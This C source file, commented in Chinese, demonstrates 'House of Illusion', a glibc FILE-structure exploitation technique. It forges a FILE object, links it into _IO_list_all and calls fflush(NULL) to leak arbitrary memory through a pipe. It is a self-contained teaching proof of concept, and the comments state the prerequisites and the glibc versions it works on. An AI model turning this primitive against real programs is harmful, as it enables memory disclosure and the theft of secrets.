#define _GNU_SOURCE

/*
 * House of Illusion 借助正常的 _IO_file_jumps 表把内存内容输出出来，
 * 适用于 glibc 2.23～2.43。
 *
 * 触发的底层系统调用是 write(fd, secret, length)，从漏洞利用的角度看，
 * 这其实是一次任意地址读：只要能让 secret 指向想窃取的内存，就能把它
 * 读出来。前提条件是已经知道 libc 加载基址，并且能让 _IO_list_all
 * 指向我们自己构造的这个 fake FILE 结构。
 */

#include <assert.h>
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define IO_CURRENTLY_PUTTING 0x0800
#define IO_IS_APPENDING 0x1000
#define IO_LINKED 0x0080

struct fake_file_plus {
    FILE file;
    const void *vtable;
};

int main(void)
{
    static char secret[] = "ILLUSION:MEMORY-TO-FD";
    char received[sizeof(secret)] = {0};
    char lock[64] = {0};
    struct fake_file_plus fake;
    int pipe_fd[2];

    memset(&fake, 0, sizeof(fake));

    /* 这里用 dlsym 直接取符号地址，只是省去手写 libc 泄漏和偏移计算的步骤；
     * 实际题目里这两个符号地址通常要靠已有的信息泄漏拿到。 */
    void **io_list_all = dlsym(RTLD_DEFAULT, "_IO_list_all");
    void *file_jumps = dlsym(RTLD_DEFAULT, "_IO_file_jumps");
    assert(io_list_all != NULL && file_jumps != NULL);

    void *saved_list = *io_list_all;

    /* 用一对 pipe 搭建验证通道：写端交给 fake FILE 当输出 fd，
     * 读端留给自己，用来确认到底泄漏出了什么内容。 */
    assert(pipe(pipe_fd) == 0);

    fake.file._lock = (void *)lock;
    fake.file._chain = NULL;
    fake.file._mode = 0;
    fake.file._flags = IO_LINKED | IO_CURRENTLY_PUTTING | IO_IS_APPENDING;
    fake.file._fileno = pipe_fd[1];

    /* _IO_write_base 到 _IO_write_ptr 这段区间，就是希望被当作缓冲区
     * 内容读出去的目标内存；_IO_do_write 最终会把它写到 fake.file._fileno
     * 对应的 fd 上。 */
    fake.file._IO_write_base = secret;
    fake.file._IO_write_ptr = secret + sizeof(secret);
    fake.file._IO_write_end = secret + sizeof(secret);

    /* 把 _IO_read_end 设成和 _IO_write_base 一样的地址，是为了让 libc
     * 认为读写指针已经对齐，从而跳过对 pipe 做 lseek 的逻辑（pipe 本身
     * 不支持 seek）。 */
    fake.file._IO_read_end = secret;

    fake.file._IO_buf_base = secret;
    fake.file._IO_buf_end = secret + sizeof(secret);

    /* 这里直接复用合法的 vtable，不做任何槽位平移，走的是标准调用路径。 */
    fake.vtable = file_jumps;

    /* 漏洞模拟的核心动作：把构造好的 fake FILE 挂进 _IO_list_all 全局
     * 链表头，再用 fflush(NULL) 触发一次全局 flush，让 libc 主动去处理
     * 这个伪造的 FILE 对象。 */
    *io_list_all = &fake;
    fflush(NULL);
    *io_list_all = saved_list;

    close(pipe_fd[1]);
    assert(read(pipe_fd[0], received, sizeof(received)) == sizeof(received));
    close(pipe_fd[0]);

    assert(memcmp(received, secret, sizeof(secret)) == 0);
    printf("[+] Illusion 任意读成功\n");
    return 0;
}
